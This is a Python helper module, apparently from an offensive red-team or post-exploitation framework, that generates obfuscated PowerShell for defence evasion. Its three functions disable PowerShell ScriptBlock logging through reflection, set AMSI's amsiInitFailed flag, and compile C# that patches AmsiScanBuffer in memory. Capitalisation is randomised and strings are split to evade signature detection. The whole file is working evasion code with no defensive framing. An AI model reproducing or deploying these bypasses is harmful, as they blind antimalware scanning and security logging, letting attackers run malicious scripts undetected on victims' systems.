import helpers


def scriptBlockLogBypass():
    # ScriptBlock Logging bypass
    bypass = helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPF")+"=[ref].Assembly.GetType(")
    bypass += "'System.Management.Automation.Utils'"
    bypass += helpers.randomize_capitalization(").\"GetFie`ld\"(")
    bypass += "'cachedGroupPolicySettings','N'+'onPublic,Static'"
    bypass += helpers.randomize_capitalization(");If($"+helpers.generate_random_script_var_name("GPF")+"){$"+helpers.generate_random_script_var_name("GPC")+"=$"+helpers.generate_random_script_var_name("GPF")+".GetValue($null);If($"+helpers.generate_random_script_var_name("GPC")+"")
    bypass += "['ScriptB'+'lockLogging']"
    bypass += helpers.randomize_capitalization("){$"+helpers.generate_random_script_var_name("GPC")+"")
    bypass += "['ScriptB'+'lockLogging']['EnableScriptB'+'lockLogging']=0;"
    bypass += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
    bypass += "['ScriptB'+'lockLogging']['EnableScriptBlockInvocationLogging']=0}"
    bypass += helpers.randomize_capitalization("$val=[Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add")
    bypass += "('EnableScriptB'+'lockLogging',0);"
    bypass += helpers.randomize_capitalization("$val.Add")
    bypass += "('EnableScriptBlockInvocationLogging',0);"
    bypass += helpers.randomize_capitalization("$"+helpers.generate_random_script_var_name("GPC")+"")
    bypass += "['HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptB'+'lockLogging']"
    bypass += helpers.randomize_capitalization("=$val}")
    bypass += helpers.randomize_capitalization("Else{[ScriptBlock].\"GetFie`ld\"(")
    bypass += "'signatures','N'+'onPublic,Static'"
    bypass += helpers.randomize_capitalization(").SetValue($null,(New-Object Collections.Generic.HashSet[string]))}")
    return bypass


def AMSIBypass():
    # @mattifestation's AMSI bypass
    bypass = helpers.randomize_capitalization("$Ref=[Ref].Assembly.GetType(")
    bypass += "'System.Management.Automation.AmsiUtils'"
    bypass += helpers.randomize_capitalization(');$Ref.GetField(')
    bypass += "'amsiInitFailed','NonPublic,Static'"
    bypass += helpers.randomize_capitalization(").SetValue($null,$true);")
    return bypass.replace('\n','').replace('    ', '')


def AMSIBypass2():
    # rastamouse's AMSI bypass (Add-Type writes *.cs on disk!!)
    bypass = """
    $id = get-random;
    $Ref = (
    "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
    "System.Runtime.InteropServices, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
    );

    $Source = @"
    using System;
    using System.Runtime.InteropServices;

    namespace Bypass
    {
        public class AMSI$id
        {
            [DllImport("kernel32")]
            public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
            [DllImport("kernel32")]
            public static extern IntPtr LoadLibrary(string name);
            [DllImport("kernel32")]
            public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

            [DllImport("Kernel32.dll", EntryPoint = "RtlMoveMemory", SetLastError = false)]
            static extern void MoveMemory(IntPtr dest, IntPtr src, int size);

            public static int Disable()
            {
                IntPtr TargetDLL = LoadLibrary("amsi.dll");
                if (TargetDLL == IntPtr.Zero) { return 1; }

                IntPtr ASBPtr = GetProcAddress(TargetDLL, "Amsi" + "Scan" + "Buffer");
                if (ASBPtr == IntPtr.Zero) { return 1; }

                UIntPtr dwSize = (UIntPtr)5;
                uint Zero = 0;

                if (!VirtualProtect(ASBPtr, dwSize, 0x40, out Zero)) { return 1; }

                Byte[] Patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
                IntPtr unmanagedPointer = Marshal.AllocHGlobal(6);
                Marshal.Copy(Patch, 0, unmanagedPointer, 6);
                MoveMemory(ASBPtr, unmanagedPointer, 6);

                return 0;
            }
        }
    }
    "@;

    Add-Type -ReferencedAssemblies $Ref -TypeDefinition $Source -Language CSharp;
    iex "[Bypass.AMSI$id]::Disable() | Out-Null"
    """

    bypass = bypass.replace('"kernel32"', '`"kernel32`"')
    bypass = bypass.replace('"Kernel32.dll"', '`"Kernel32.dll`"')
    bypass = bypass.replace('"RtlMoveMemory"', '`"RtlMoveMemory`"')
    bypass = bypass.replace('"amsi.dll"', '`"amsi.dll`"')
    bypass = bypass.replace('"Amsi"', '`"Amsi`"')
    bypass = bypass.replace('"Scan"', '`"Scan`"')
    bypass = bypass.replace('"Buffer"', '`"Buffer`"')
    bypass = bypass.replace('@"','"')
    bypass = bypass.replace('"@','"')
    bypass = bypass.replace('\n','')
    bypass = bypass.replace('    ', '')
    return bypass
